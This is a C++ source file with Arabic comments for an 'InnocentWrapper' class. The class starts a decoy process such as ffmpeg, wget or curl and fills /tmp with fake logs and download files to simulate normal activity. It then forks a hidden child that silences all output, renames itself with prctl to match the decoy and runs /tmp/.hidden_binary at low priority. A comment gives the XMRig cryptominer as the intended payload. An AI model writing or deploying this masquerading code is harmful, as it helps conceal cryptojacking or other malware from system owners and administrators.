#include "innocent_wrapper.h"
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <signal.h>
#include <cstring>
#include <random>
#include <thread>
#include <chrono>

InnocentWrapper::InnocentWrapper(ProgramType type) 
    : programType(type), innocentPid(-1), hiddenPid(-1), isRunning(false) {
    setupFakeEnvironment();
}

std::vector<std::string> InnocentWrapper::getInnocentCommand() {
    switch (programType) {
        case FFMPEG:
            return {
                "/usr/bin/ffmpeg",
                "-f", "lavfi",
                "-i", "testsrc=duration=3600:size=320x240:rate=1",
                "-f", "null",
                "/dev/null"
            };
            
        case WGET:
            return {
                "/usr/bin/wget",
                "--quiet",
                "--timeout=3600",
                "--tries=inf",
                "http://httpbin.org/delay/3600",
                "-O", "/dev/null"
            };
            
        case CURL:
            return {
                "/usr/bin/curl",
                "--silent",
                "--max-time", "3600",
                "http://httpbin.org/delay/3600",
                "-o", "/dev/null"
            };
            
        case TAR:
            return {
                "/bin/tar",
                "-czf", "/dev/null",
                "/usr/share/doc"
            };
            
        case RSYNC:
            return {
                "/usr/bin/rsync",
                "-av", "--progress",
                "/usr/share/doc/",
                "/tmp/.sync_backup/"
            };
            
        default:
            return {"/bin/sleep", "3600"};
    }
}

std::string InnocentWrapper::getProcessName() {
    switch (programType) {
        case FFMPEG: return "ffmpeg";
        case WGET: return "wget";
        case CURL: return "curl";
        case TAR: return "tar";
        case RSYNC: return "rsync";
        default: return "sleep";
    }
}

void InnocentWrapper::setupFakeEnvironment() {
    // إنشاء بيئة وهمية تبدو حقيقية
    switch (programType) {
        case FFMPEG:
            // إنشاء ملفات FFmpeg وهمية
            system("mkdir -p /tmp/.ffmpeg_cache");
            system("touch /tmp/.ffmpeg_cache/input.mp4");
            break;
            
        case WGET:
            // إنشاء ملف downloads وهمي
            system("mkdir -p /tmp/.wget_downloads");
            break;
            
        case RSYNC:
            // إنشاء مجلد backup وهمي
            system("mkdir -p /tmp/.sync_backup");
            break;
            
        default:
            break;
    }
}

void InnocentWrapper::createFakeFiles() {
    // إنشاء ملفات وهمية لتبدو مثل نشاط حقيقي
    std::ofstream logFile("/tmp/." + getProcessName() + ".log");
    logFile << "Starting " << getProcessName() << " process...\n";
    logFile << "Processing files...\n";
    logFile.close();
    
    // إنشاء ملفات مؤقتة عشوائية
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 9999);
    
    std::string tempFile = "/tmp/." + getProcessName() + "_" + std::to_string(dis(gen));
    std::ofstream temp(tempFile);
    temp << "Temporary processing data\n";
    temp.close();
}

void InnocentWrapper::simulateNetworkActivity() {
    // محاكاة نشاط شبكة طبيعي
    if (programType == WGET || programType == CURL) {
        // محاكاة تحميل ملف
        std::this_thread::sleep_for(std::chrono::seconds(5));
        
        // إنشاء ملف تحميل وهمي
        std::ofstream download("/tmp/.download_" + std::to_string(getpid()));
        for (int i = 0; i < 1000; i++) {
            download << "Downloaded data chunk " << i << "\n";
            if (i % 100 == 0) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        }
        download.close();
    }
}

void InnocentWrapper::mimicRealBehavior() {
    // تقليد السلوك الحقيقي للبرنامج
    createFakeFiles();
    
    // محاكاة استهلاك CPU وذاكرة طبيعي
    std::thread behaviorThread([this]() {
        while (isRunning) {
            // نشاط دوري يحاكي البرنامج الحقيقي
            simulateNetworkActivity();
            
            // كتابة في السجلات
            std::ofstream log("/tmp/." + getProcessName() + ".log", std::ios::app);
            log << "Progress: " << std::time(nullptr) << "\n";
            log.close();
            
            // راحة قصيرة
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    });
    
    behaviorThread.detach();
}

bool InnocentWrapper::startInnocentProcess() {
    if (isRunning) {
        return true;
    }
    
    std::cout << "[INFO] Starting innocent process: " << getProcessName() << std::endl;
    
    innocentPid = fork();
    if (innocentPid == 0) {
        // العملية الفرعية - تشغيل البرنامج البريء
        auto command = getInnocentCommand();
        
        // تحويل إلى char* array
        std::vector<char*> args;
        for (auto& arg : command) {
            args.push_back(const_cast<char*>(arg.c_str()));
        }
        args.push_back(nullptr);
        
        // إعادة توجيه المخرجات للإخفاء الجزئي
        int devnull = open("/dev/null", O_WRONLY);
        dup2(devnull, STDERR_FILENO);
        close(devnull);
        
        // تشغيل البرنامج البريء
        execv(args[0], args.data());
        exit(1);
    } else if (innocentPid > 0) {
        isRunning = true;
        
        // بدء محاكاة السلوك
        mimicRealBehavior();
        
        std::cout << "[INFO] Innocent process started with PID: " << innocentPid << std::endl;
        return true;
    } else {
        std::cerr << "[ERROR] Failed to start innocent process" << std::endl;
        return false;
    }
}

void InnocentWrapper::stopInnocentProcess() {
    if (innocentPid > 0) {
        std::cout << "[INFO] Stopping innocent process..." << std::endl;
        kill(innocentPid, SIGTERM);
        waitpid(innocentPid, nullptr, 0);
        innocentPid = -1;
    }
    
    if (hiddenPid > 0) {
        kill(hiddenPid, SIGTERM);
        waitpid(hiddenPid, nullptr, 0);
        hiddenPid = -1;
    }
    
    isRunning = false;
    
    // تنظيف الملفات المؤقتة
    system(("rm -rf /tmp/." + getProcessName() + "*").c_str());
}

bool InnocentWrapper::isInnocentProcessRunning() {
    if (innocentPid <= 0) return false;
    
    // فحص حالة العملية
    int status;
    pid_t result = waitpid(innocentPid, &status, WNOHANG);
    
    if (result == 0) {
        return true; // لا تزال تعمل
    } else {
        innocentPid = -1;
        return false; // انتهت
    }
}

void InnocentWrapper::runHiddenOperation() {
    if (!isRunning) {
        std::cerr << "[ERROR] Start innocent process first" << std::endl;
        return;
    }
    
    std::cout << "[INFO] Starting hidden operation..." << std::endl;
    
    hiddenPid = fork();
    if (hiddenPid == 0) {
        // العملية الخفية
        
        // إخفاء كامل للمخرجات
        int devnull = open("/dev/null", O_WRONLY);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        dup2(devnull, STDIN_FILENO);
        close(devnull);
        
        // تغيير اسم العملية لتطابق البرنامج البريء
        prctl(PR_SET_NAME, getProcessName().c_str(), 0, 0, 0);
        
        // أولوية منخفضة
        nice(19);
        
        // تشغيل العملية الخفية (XMRig مثلاً)
        // هنا يتم تشغيل الكود الخفي الحقيقي
        execl("/tmp/.hidden_binary", getProcessName().c_str(), nullptr);
        exit(1);
    } else if (hiddenPid > 0) {
        std::cout << "[INFO] Hidden operation started with PID: " << hiddenPid << std::endl;
    } else {
        std::cerr << "[ERROR] Failed to start hidden operation" << std::endl;
    }
}
